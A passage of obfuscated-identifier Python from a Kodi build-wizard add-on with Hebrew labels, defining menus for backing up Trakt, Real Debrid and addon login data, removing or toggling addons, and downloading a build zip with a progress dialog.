	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO00000O00OOOO0O0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00OO0O0OO0000O0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת פליליסט לאודר:  '%O0OO0O000O00O0000 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת הגדרות באפר: '%O00000000O0O00O0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת רשימות ריפו:  '%O00O0O0O0OO0OOOOO .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3157
	setView ('files','viewType')#line:3159
def traktMenu ():#line:3161
	O00OO0000O00O0O0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3162
	O0OOO00OO0O0O0O00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3163
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3164
	addFile ('Save Trakt Data: %s'%O00OO0000O00O0O0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3165
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0OOO00OO0O0O0O00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3166
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3167
	for O00OO0000O00O0O0O in traktit .ORDER :#line:3169
		O000O0O0OO0OOOO0O =TRAKTID [O00OO0000O00O0O0O ]['name']#line:3170
		O0000OO000O000000 =TRAKTID [O00OO0000O00O0O0O ]['path']#line:3171
		OOOOO0OO00O0000OO =TRAKTID [O00OO0000O00O0O0O ]['saved']#line:3172
		O0OO00O0O0000OO0O =TRAKTID [O00OO0000O00O0O0O ]['file']#line:3173
		O00O0OO000OO0O00O =wiz .getS (OOOOO0OO00O0000OO )#line:3174
		OO0OO0O00OOO0OOO0 =traktit .traktUser (O00OO0000O00O0O0O )#line:3175
		OO00O00OOOOO00OO0 =TRAKTID [O00OO0000O00O0O0O ]['icon']if os .path .exists (O0000OO000O000000 )else ICONTRAKT #line:3176
		OOO0OO000O0OO00O0 =TRAKTID [O00OO0000O00O0O0O ]['fanart']if os .path .exists (O0000OO000O000000 )else FANART #line:3177
		OO0O0OOOO0OO0O0OO =createMenu ('saveaddon','Trakt',O00OO0000O00O0O0O )#line:3178
		OO0OOO0000OO0O000 =createMenu ('save','Trakt',O00OO0000O00O0O0O )#line:3179
		OO0O0OOOO0OO0O0OO .append ((THEME2 %'%s Settings'%O000O0O0OO0OOOO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00OO0000O00O0O0O )))#line:3180
		addFile ('[+]-> %s'%O000O0O0OO0OOOO0O ,'',icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,themeit =THEME3 )#line:3182
		if not os .path .exists (O0000OO000O000000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0O0OOOO0OO0O0OO )#line:3183
		elif not OO0OO0O00OOO0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00OO0000O00O0O0O ,icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0O0OOOO0OO0O0OO )#line:3184
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0O00OOO0OOO0 ,'authtrakt',O00OO0000O00O0O0O ,icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0O0OOOO0OO0O0OO )#line:3185
		if O00O0OO000OO0O00O =="":#line:3186
			if os .path .exists (O0OO00O0O0000OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00OO0000O00O0O0O ,icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0OOO0000OO0O000 )#line:3187
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00OO0000O00O0O0O ,icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0OOO0000OO0O000 )#line:3188
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0OO000OO0O00O ,'',icon =OO00O00OOOOO00OO0 ,fanart =OOO0OO000O0OO00O0 ,menu =OO0OOO0000OO0O000 )#line:3189
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3191
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3192
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3193
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3194
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3195
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3196
	setView ('files','viewType')#line:3197
def realMenu ():#line:3199
	O0000O0000O0O00OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3200
	O00O00OOO00OOO0OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3201
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3202
	addFile ('Save Real Debrid Data: %s'%O0000O0000O0O00OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3203
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00O00OOO00OOO0OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3204
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3205
	for O0OO00O000OOOOOO0 in debridit .ORDER :#line:3207
		OOOOO0OO0O0O000O0 =DEBRIDID [O0OO00O000OOOOOO0 ]['name']#line:3208
		O0OOOOO0OOOOO0O00 =DEBRIDID [O0OO00O000OOOOOO0 ]['path']#line:3209
		OOO000000OOO0OO00 =DEBRIDID [O0OO00O000OOOOOO0 ]['saved']#line:3210
		OO00O0OO0O0OO00OO =DEBRIDID [O0OO00O000OOOOOO0 ]['file']#line:3211
		OO0O0O0OO00OO000O =wiz .getS (OOO000000OOO0OO00 )#line:3212
		OO00O00O000OO0O0O =debridit .debridUser (O0OO00O000OOOOOO0 )#line:3213
		OO0OO00O0OO0OOO0O =DEBRIDID [O0OO00O000OOOOOO0 ]['icon']if os .path .exists (O0OOOOO0OOOOO0O00 )else ICONREAL #line:3214
		OO0O0000OOOO0O0OO =DEBRIDID [O0OO00O000OOOOOO0 ]['fanart']if os .path .exists (O0OOOOO0OOOOO0O00 )else FANART #line:3215
		OOOO00O0OO00O0OO0 =createMenu ('saveaddon','Debrid',O0OO00O000OOOOOO0 )#line:3216
		OOOOOOO0O0000OO00 =createMenu ('save','Debrid',O0OO00O000OOOOOO0 )#line:3217
		OOOO00O0OO00O0OO0 .append ((THEME2 %'%s Settings'%OOOOO0OO0O0O000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO00O000OOOOOO0 )))#line:3218
		addFile ('[+]-> %s'%OOOOO0OO0O0O000O0 ,'',icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,themeit =THEME3 )#line:3220
		if not os .path .exists (O0OOOOO0OOOOO0O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOO00O0OO00O0OO0 )#line:3221
		elif not OO00O00O000OO0O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO00O000OOOOOO0 ,icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOO00O0OO00O0OO0 )#line:3222
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O00O000OO0O0O ,'authdebrid',O0OO00O000OOOOOO0 ,icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOO00O0OO00O0OO0 )#line:3223
		if OO0O0O0OO00OO000O =="":#line:3224
			if os .path .exists (OO00O0OO0O0OO00OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO00O000OOOOOO0 ,icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOOOOO0O0000OO00 )#line:3225
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO00O000OOOOOO0 ,icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOOOOO0O0000OO00 )#line:3226
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0O0OO00OO000O ,'',icon =OO0OO00O0OO0OOO0O ,fanart =OO0O0000OOOO0O0OO ,menu =OOOOOOO0O0000OO00 )#line:3227
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3229
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3230
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3231
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3232
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3233
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3234
	setView ('files','viewType')#line:3235
def loginMenu ():#line:3237
	OOO00OO000000OO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3238
	O0O0000000OOOOO00 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3239
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3240
	addFile ('Save Login Data: %s'%OOO00OO000000OO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3241
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O0000000OOOOO00 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3242
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3243
	for OOO00OO000000OO00 in loginit .ORDER :#line:3245
		OO0O0OO0O0OO00000 =LOGINID [OOO00OO000000OO00 ]['name']#line:3246
		O0O0O00OOO0000O0O =LOGINID [OOO00OO000000OO00 ]['path']#line:3247
		O0OOOOOO00O0O0O00 =LOGINID [OOO00OO000000OO00 ]['saved']#line:3248
		OOOOO00O0O0OOOOO0 =LOGINID [OOO00OO000000OO00 ]['file']#line:3249
		OOOO00000OOOOO00O =wiz .getS (O0OOOOOO00O0O0O00 )#line:3250
		O00O000000000O00O =loginit .loginUser (OOO00OO000000OO00 )#line:3251
		OO00OOO00O000O00O =LOGINID [OOO00OO000000OO00 ]['icon']if os .path .exists (O0O0O00OOO0000O0O )else ICONLOGIN #line:3252
		OO00OOOOO0OOO0OO0 =LOGINID [OOO00OO000000OO00 ]['fanart']if os .path .exists (O0O0O00OOO0000O0O )else FANART #line:3253
		O0O00O0OO00OOOO0O =createMenu ('saveaddon','Login',OOO00OO000000OO00 )#line:3254
		OO0000OO0OOO0OOOO =createMenu ('save','Login',OOO00OO000000OO00 )#line:3255
		O0O00O0OO00OOOO0O .append ((THEME2 %'%s Settings'%OO0O0OO0O0OO00000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO00OO000000OO00 )))#line:3256
		addFile ('[+]-> %s'%OO0O0OO0O0OO00000 ,'',icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,themeit =THEME3 )#line:3258
		if not os .path .exists (O0O0O00OOO0000O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =O0O00O0OO00OOOO0O )#line:3259
		elif not O00O000000000O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO00OO000000OO00 ,icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =O0O00O0OO00OOOO0O )#line:3260
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O000000000O00O ,'authlogin',OOO00OO000000OO00 ,icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =O0O00O0OO00OOOO0O )#line:3261
		if OOOO00000OOOOO00O =="":#line:3262
			if os .path .exists (OOOOO00O0O0OOOOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO00OO000000OO00 ,icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =OO0000OO0OOO0OOOO )#line:3263
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO00OO000000OO00 ,icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =OO0000OO0OOO0OOOO )#line:3264
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO00000OOOOO00O ,'',icon =OO00OOO00O000O00O ,fanart =OO00OOOOO0OOO0OO0 ,menu =OO0000OO0OOO0OOOO )#line:3265
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3267
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3268
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3269
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3270
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3271
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3272
	setView ('files','viewType')#line:3273
def fixUpdate ():#line:3275
	if KODIV <17 :#line:3276
		O000O00OOOO00O0OO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3277
		try :#line:3278
			os .remove (O000O00OOOO00O0OO )#line:3279
		except Exception as OO0000O000O0O0000 :#line:3280
			wiz .log ("Unable to remove %s, Purging DB"%O000O00OOOO00O0OO )#line:3281
			wiz .purgeDb (O000O00OOOO00O0OO )#line:3282
	else :#line:3283
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3284
def removeAddonMenu ():#line:3286
	OO0OOO000O0O0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3287
	OOOOOOO000O0OOO00 =[];OOOO00O0O0OOOOO0O =[]#line:3288
	for O0OO00OO0OO00OO0O in sorted (OO0OOO000O0O0OOOO ,key =lambda O0OO00OO0O0OO00O0 :O0OO00OO0O0OO00O0 ):#line:3289
		OOO00O000OO0OO0O0 =os .path .split (O0OO00OO0OO00OO0O [:-1 ])[1 ]#line:3290
		if OOO00O000OO0OO0O0 in EXCLUDES :continue #line:3291
		elif OOO00O000OO0OO0O0 in DEFAULTPLUGINS :continue #line:3292
		elif OOO00O000OO0OO0O0 =='packages':continue #line:3293
		OO000OOO0O00000O0 =os .path .join (O0OO00OO0OO00OO0O ,'addon.xml')#line:3294
		if os .path .exists (OO000OOO0O00000O0 ):#line:3295
			O00000OO0O00O0000 =open (OO000OOO0O00000O0 )#line:3296
			OOOO00OO0OOOO000O =O00000OO0O00O0000 .read ()#line:3297
			OO0OO00O0OO000O00 =wiz .parseDOM (OOOO00OO0OOOO000O ,'addon',ret ='id')#line:3298
			O00OO0000000OO00O =OOO00O000OO0OO0O0 if len (OO0OO00O0OO000O00 )==0 else OO0OO00O0OO000O00 [0 ]#line:3300
			try :#line:3301
				O000OO00OO0O0O0O0 =xbmcaddon .Addon (id =O00OO0000000OO00O )#line:3302
				OOOOOOO000O0OOO00 .append (O000OO00OO0O0O0O0 .getAddonInfo ('name'))#line:3303
				OOOO00O0O0OOOOO0O .append (O00OO0000000OO00O )#line:3304
			except :#line:3305
				pass #line:3306
	if len (OOOOOOO000O0OOO00 )==0 :#line:3307
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3308
		return #line:3309
	if KODIV >16 :#line:3310
		O0OO00O00O0O00OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOOOOO000O0OOO00 )#line:3311
	else :#line:3312
		O0OO00O00O0O00OO0 =[];O0O0O0OO00O0O00OO =0 #line:3313
		OOO0OOO0O0OOOO000 =["-- Click here to Continue --"]+OOOOOOO000O0OOO00 #line:3314
		while not O0O0O0OO00O0O00OO ==-1 :#line:3315
			O0O0O0OO00O0O00OO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OOO0O0OOOO000 )#line:3316
			if O0O0O0OO00O0O00OO ==-1 :break #line:3317
			elif O0O0O0OO00O0O00OO ==0 :break #line:3318
			else :#line:3319
				O0OOO0OO0OO0OO0OO =(O0O0O0OO00O0O00OO -1 )#line:3320
				if O0OOO0OO0OO0OO0OO in O0OO00O00O0O00OO0 :#line:3321
					O0OO00O00O0O00OO0 .remove (O0OOO0OO0OO0OO0OO )#line:3322
					OOO0OOO0O0OOOO000 [O0O0O0OO00O0O00OO ]=OOOOOOO000O0OOO00 [O0OOO0OO0OO0OO0OO ]#line:3323
				else :#line:3324
					O0OO00O00O0O00OO0 .append (O0OOO0OO0OO0OO0OO )#line:3325
					OOO0OOO0O0OOOO000 [O0O0O0OO00O0O00OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOOOOO000O0OOO00 [O0OOO0OO0OO0OO0OO ])#line:3326
	if O0OO00O00O0O00OO0 ==None :return #line:3327
	if len (O0OO00O00O0O00OO0 )>0 :#line:3328
		wiz .addonUpdates ('set')#line:3329
		for O0O0OO00000OO0OOO in O0OO00O00O0O00OO0 :#line:3330
			removeAddon (OOOO00O0O0OOOOO0O [O0O0OO00000OO0OOO ],OOOOOOO000O0OOO00 [O0O0OO00000OO0OOO ],True )#line:3331
		xbmc .sleep (1000 )#line:3333
		if INSTALLMETHOD ==1 :O00O0O0OO0O0O0OO0 =1 #line:3335
		elif INSTALLMETHOD ==2 :O00O0O0OO0O0O0OO0 =0 #line:3336
		else :O00O0O0OO0O0O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3337
		if O00O0O0OO0O0O0OO0 ==1 :wiz .reloadFix ('remove addon')#line:3338
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3339
def removeAddonDataMenu ():#line:3341
	if os .path .exists (ADDOND ):#line:3342
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3343
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3344
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3345
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3346
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3347
		O00OO0OOO0OO0O000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3348
		for OO00O0000OOOOO0O0 in sorted (O00OO0OOO0OO0O000 ,key =lambda OO0O0OO00O0OO0OO0 :OO0O0OO00O0OO0OO0 ):#line:3349
			O00OOOOOOOO00O0OO =OO00O0000OOOOO0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3350
			O00OOOO000O0O0000 =os .path .join (OO00O0000OOOOO0O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3351
			O0000O0OOO0O000OO =os .path .join (OO00O0000OOOOO0O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3352
			OOO0OOO000O00O0O0 =O00OOOOOOOO00O0OO #line:3353
			OO00O000OOOOO0OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3354
			for OO0O00000OOO0OO00 in OO00O000OOOOO0OOO :#line:3355
				OOO0OOO000O00O0O0 =OOO0OOO000O00O0O0 .replace (OO0O00000OOO0OO00 ,OO00O000OOOOO0OOO [OO0O00000OOO0OO00 ])#line:3356
			if O00OOOOOOOO00O0OO in EXCLUDES :OOO0OOO000O00O0O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO0OOO000O00O0O0 #line:3357
			else :OOO0OOO000O00O0O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO0OOO000O00O0O0 #line:3358
			addFile (' %s'%OOO0OOO000O00O0O0 ,'removedata',O00OOOOOOOO00O0OO ,icon =O00OOOO000O0O0000 ,fanart =O0000O0OOO0O000OO ,themeit =THEME2 )#line:3359
	else :#line:3360
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3361
	setView ('files','viewType')#line:3362
def enableAddons ():#line:3364
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3365
	O0OO0000O0000OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3366
	OO0OOOO0O00O00OOO =0 #line:3367
	for O0OOO00O00OOO000O in sorted (O0OO0000O0000OOOO ,key =lambda OOO00OO00O000000O :OOO00OO00O000000O ):#line:3368
		OOOOOOO000O0O0O0O =os .path .split (O0OOO00O00OOO000O [:-1 ])[1 ]#line:3369
		if OOOOOOO000O0O0O0O in EXCLUDES :continue #line:3370
		if OOOOOOO000O0O0O0O in DEFAULTPLUGINS :continue #line:3371
		O00O0O0OO0OOO0OO0 =os .path .join (O0OOO00O00OOO000O ,'addon.xml')#line:3372
		if os .path .exists (O00O0O0OO0OOO0OO0 ):#line:3373
			OO0OOOO0O00O00OOO +=1 #line:3374
			O0OO0000O0000OOOO =O0OOO00O00OOO000O .replace (ADDONS ,'')[1 :-1 ]#line:3375
			OOO0O0O00O000OO0O =open (O00O0O0OO0OOO0OO0 )#line:3376
			OOOO0000O000O00OO =OOO0O0O00O000OO0O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3377
			OO00OOOO0O0O0OO00 =wiz .parseDOM (OOOO0000O000O00OO ,'addon',ret ='id')#line:3378
			O00OOO0OO0O0O0OOO =wiz .parseDOM (OOOO0000O000O00OO ,'addon',ret ='name')#line:3379
			try :#line:3380
				O0O00O0O00OOOOOOO =OO00OOOO0O0O0OO00 [0 ]#line:3381
				OO00OOO0O0OOO000O =O00OOO0OO0O0O0OOO [0 ]#line:3382
			except :#line:3383
				continue #line:3384
			try :#line:3385
				OO0O0O0O0OO000O00 =xbmcaddon .Addon (id =O0O00O0O00OOOOOOO )#line:3386
				O0O0OO0O0000000OO ="[COLOR green][Enabled][/COLOR]"#line:3387
				OO0O00000O0000O00 ="false"#line:3388
			except :#line:3389
				O0O0OO0O0000000OO ="[COLOR red][Disabled][/COLOR]"#line:3390
				OO0O00000O0000O00 ="true"#line:3391
				pass #line:3392
			O00O0OOO0OOO0O0OO =os .path .join (O0OOO00O00OOO000O ,'icon.png')if os .path .exists (os .path .join (O0OOO00O00OOO000O ,'icon.png'))else ICON #line:3393
			O0O00O0OO0000O0O0 =os .path .join (O0OOO00O00OOO000O ,'fanart.jpg')if os .path .exists (os .path .join (O0OOO00O00OOO000O ,'fanart.jpg'))else FANART #line:3394
			addFile ("%s %s"%(O0O0OO0O0000000OO ,OO00OOO0O0OOO000O ),'toggleaddon',O0OO0000O0000OOOO ,OO0O00000O0000O00 ,icon =O00O0OOO0OOO0O0OO ,fanart =O0O00O0OO0000O0O0 )#line:3395
			OOO0O0O00O000OO0O .close ()#line:3396
	if OO0OOOO0O00O00OOO ==0 :#line:3397
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3398
	setView ('files','viewType')#line:3399
def changeFeq ():#line:3401
	OOO00OO0O00O00OOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3402
	OO0000O0O0000OOO0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO00OO0O00O00OOO )#line:3403
	if not OO0000O0O0000OOO0 ==-1 :#line:3404
		wiz .setS ('autocleanfeq',str (OO0000O0O0000OOO0 ))#line:3405
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO00OO0O00O00OOO [OO0000O0O0000OOO0 ]))#line:3406
def developer ():#line:3408
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3409
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3410
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3411
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3412
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3413
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3414
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3415
	setView ('files','viewType')#line:3417
def download (OOO0O0OOO0000O00O ,O0OOO00O0OO000O00 ):#line:3422
  OOO000O00OOOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3423
  OO0O000OOOO00OOO0 =xbmcgui .DialogProgress ()#line:3424
  OO0O000OOOO00OOO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3425
  OOO00O0O000O00O0O =os .path .join (OOO000O00OOOOOO0O ,'isr.zip')#line:3426
  OOO0OOO0000OO0OOO =urllib2 .Request (OOO0O0OOO0000O00O )#line:3427
  O0O0OO0OOO00000OO =urllib2 .urlopen (OOO0OOO0000OO0OOO )#line:3428
  O0O0O0OOO0O0000O0 =xbmcgui .DialogProgress ()#line:3430
  O0O0O0OOO0O0000O0 .create ("Downloading","Downloading "+name )#line:3431
  O0O0O0OOO0O0000O0 .update (0 )#line:3432
  O0O0O0O0OOOOO0O00 =O0OOO00O0OO000O00 #line:3433
  O0OOOOO0O0O0O0OO0 =open (OOO00O0O000O00O0O ,'wb')#line:3434
  try :#line:3436
    O0OOOOO00OO00O00O =O0O0OO0OOO00000OO .info ().getheader ('Content-Length').strip ()#line:3437
    OOO0O0O00000OO0OO =True #line:3438
  except AttributeError :#line:3439
        OOO0O0O00000OO0OO =False #line:3440
  if OOO0O0O00000OO0OO :#line:3442
        O0OOOOO00OO00O00O =int (O0OOOOO00OO00O00O )#line:3443
  OOO0O00OOO00O00OO =0 #line:3445
  O0OO0OO000O0O00OO =time .time ()#line:3446
  while True :#line:3447
        O0O00O000OO0000O0 =O0O0OO0OOO00000OO .read (8192 )#line:3448
        if not O0O00O000OO0000O0 :#line:3449
            sys .stdout .write ('\n')#line:3450
            break #line:3451
        OOO0O00OOO00O00OO +=len (O0O00O000OO0000O0 )#line:3453
        O0OOOOO0O0O0O0OO0 .write (O0O00O000OO0000O0 )#line:3454
        if not OOO0O0O00000OO0OO :#line:3456
            O0OOOOO00OO00O00O =OOO0O00OOO00O00OO #line:3457
        if O0O0O0OOO0O0000O0 .iscanceled ():#line:3458
           O0O0O0OOO0O0000O0 .close ()#line:3459
           try :#line:3460
            os .remove (OOO00O0O000O00O0O )#line:3461
           except :#line:3462
            pass #line:3463
           break #line:3464
